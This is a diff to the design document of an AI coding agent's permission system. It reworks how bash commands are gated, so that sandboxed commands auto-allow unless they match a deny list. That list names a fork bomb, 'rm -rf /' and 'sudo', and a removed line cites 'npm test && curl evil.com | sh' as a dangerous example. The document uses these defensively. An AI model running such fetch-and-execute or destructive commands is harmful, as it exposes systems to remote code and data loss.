@@ -245,14 +245,37 @@ Tool call arrives
 1. Session-scoped allow rules  (you said "always allow bash for this session")
    │ no match
    ▼
-2. Static defaults             (table in §5: read-only → allow, bash → ask)
-   │ ask
+2. Static defaults             (table in §5: read-only → allow, bash → rule-matched)
+   │
    ▼
-3. Per-tool safety checks      (e.g. write_file outside workspace → ask, even if rule said allow)
+3. Tool-specific checks:
+   ├─ bash  → checkBashCommand() sub-pipeline (see below)
+   ├─ write_file / edit_file → allow inside workspace, ask outside
+   └─ git_push → deny on protected branches, allow otherwise
    │
    ▼
 4. Emit `permission_requested` event, agent loop awaits resolution
 ```
+
+#### Bash sub-pipeline (checkBashCommand)
+
+```
+Bash command arrives
+   │
+   ▼
+1. bashDeny patterns match?   → DENY   (hard block, no override)
+   │ no match
+   ▼
+2. Sandbox active?            → ALLOW  (container IS the safety boundary)
+   │ no sandbox
+   ▼
+3. Session rule "always allow"? → ALLOW
+   │ no match
+   ▼
+4. bashAllow patterns match?  → ALLOW
+   │ no match
+   ▼
+5. Default                    → ASK
 
 ### Trust model defaults (your choices, codified)
 
@@ -311,26 +334,31 @@ Bash is the spiciest tool. A regex/glob matcher gates it:
     "^node -v$"
   ],
   "bashDeny": [
-    // Hard deny — these never auto-allow even if they match an allow rule
-    "rm -rf /",
-    "^sudo ",
-    ":\\(\\)\\{ :\\|:& \\};:"   // fork bomb
+    // Hard deny — these never auto-allow, even in sandbox or with "always allow"
+    ":\\(\\)\\{ :\\|:& \\};:",   // fork bomb
+    "^rm -rf /",                 // delete root
+    "^sudo "                     // privilege escalation
   ]
 }
 ```
 
 **Match logic** (in this order):
-1. If any `bashDeny` regex matches → **deny** (no override, even by user "always allow")
-2. If any `bashAllow` regex matches → **allow**
-3. Otherwise → **ask**
+1. If any `bashDeny` regex matches → **deny** (no override, even in sandbox or by "always allow")
+2. If sandbox is active → **allow** (the container handles isolation — deny list is the only gate)
+3. If session has "always allow bash" → **allow**
+4. If any `bashAllow` regex matches → **allow**
+5. Otherwise → **ask**
 
-**Why allow rules are conservative regexes, not "any command starting with `npm`":**
-- `npm test && curl evil.com | sh` starts with `npm` and is catastrophic
-- The matchers anchor with `^...$` and forbid shell metacharacters in argument positions where they're dangerous
-- `cat` allows a single path argument with no metacharacters; `cat foo.txt | curl ...` doesn't match
+**Sandbox auto-allow:** When `sandboxImage` is configured (which is always, by default), all bash commands that pass the deny check are auto-allowed. The container is the safety boundary — it isolates filesystem access, limits network exposure, and prevents host tampering. This gives the agent full autonomy while keeping the host safe.
+
+**Why the auto-allow is safe:**
+- Commands run inside a Podman rootless container, not on the host
+- The only shared filesystem is the workspace volume mount (`/work`)
+- All other tool paths (file reads/writes, git operations) are path-isolated via `resolvePath()`
+- The deny list blocks catastrophic commands regardless of sandbox state
 
 **Why a deny list at all:**
-Defense in depth. If you (or a future config edit) accidentally write a too-broad allow rule, the deny list still blocks the catastrophic cases. The deny list is intentionally tiny — it's not a sandbox, it's a panic brake.
+Defense in depth. Even inside a container, `rm -rf /` destroys the workspace. A fork bomb consumes host CPU. The deny list is intentionally tiny — it's a panic brake, not a sandbox replacement. Default deny patterns are built in (`DEFAULT_BASH_DENY`) and users can extend them in config.
 
 ### Protected branches (for `git_push`)
 
@@ -868,13 +896,13 @@ This is one of the things the event-log architecture makes free: deep linking, m
 ## 18. Resolved and open questions
 
 Resolved during implementation:
-1. **Bash allow rules** — regex matchers are in `PermissionGate.checkBashCommand()`. Rules are loaded from `~/.pocket/config.json`. The deny list always wins, even over session-scoped allows.
+1. **Bash allow rules** — regex matchers are in `PermissionGate.checkBashCommand()`. Rules are loaded from `~/.pocket/config.json`. When `sandboxImage` is set (always by default), all non-denied bash commands auto-allow — the container handles isolation. Without sandbox, the allow/deny/ask flow applies. The deny list always wins, even over sandbox and session-scoped allows. Default deny patterns (`DEFAULT_BASH_DENY`) include fork bombs, `rm -rf /`, and `sudo`.
 2. **Process buffer size** — 4MB per stream per process. 8 processes × 2 streams × 4MB = 64MB worst case. Configurable via `processBufferSize` in config.
 3. **Foreground bash timeout** — 5 minutes. On timeout, the process gets SIGTERM and the tool returns `{ timedOut: true }`.
 4. **HTTP framework** — Fastify (not Express). Chosen for better SSE support and performance.
 5. **Monorepo tool** — pnpm workspaces (not Nx). Simpler, fewer dependencies, already working.
 6. **Message reconstruction from event log** — `buildMessages()` groups tool calls per `assistant_text_done` boundary so multi-turn sessions maintain correct LLM context. Earlier v1 lumped all tool calls onto the last assistant message, which corrupted history and caused loop stalls on flash models.
-7. **Sandbox isolation** — foreground bash commands run in persistent Podman containers. `packages/tools/src/sandbox.ts` provides `ensureContainer()` (starts via `podman run -d --name pocket-{sessionId}`), `execInContainer()` (via `podman exec`), and `stopSandboxContainer()` for cleanup. 30-minute idle timeout. Default image: `nikolaik/python-nodejs:python3.12-nodejs22`. Background processes use ephemeral `--rm` containers.
+7. **Sandbox isolation** — foreground bash commands run in persistent Podman containers. `packages/tools/src/sandbox.ts` provides `ensureContainer()` (starts via `podman run -d --name pocket-{sessionId}`), `execInContainer()` (via `podman exec`), and `stopSandboxContainer()` for cleanup. 30-minute idle timeout. Default image: `nikolaik/python-nodejs:python3.12-nodejs22` (via `DEFAULT_SANDBOX_IMAGE` constant). Background processes use ephemeral `--rm` containers. When sandbox is active, all bash commands auto-allow (except `DEFAULT_BASH_DENY` patterns) — the container handles isolation, not the permission gate. `sandboxImage` is validated at every entry point (config, API, session creation) to prevent bypass via null/empty string.
 
 8. **Auto-bootstrap on clone** — after workspace is ready (cloned + sandbox started), `bootstrap_repo` tool automatically runs. It detects project type (node/python/rust/go), package manager (npm/pnpm/yarn/pip/cargo), scripts from package.json, config files (Vite, React, Next.js, Express, FastAPI, Django), and suggested dev server ports. It runs dependency install in the sandbox. Results are included in the agent's system prompt so the agent knows the exact commands for this repo instead of guessing.
 
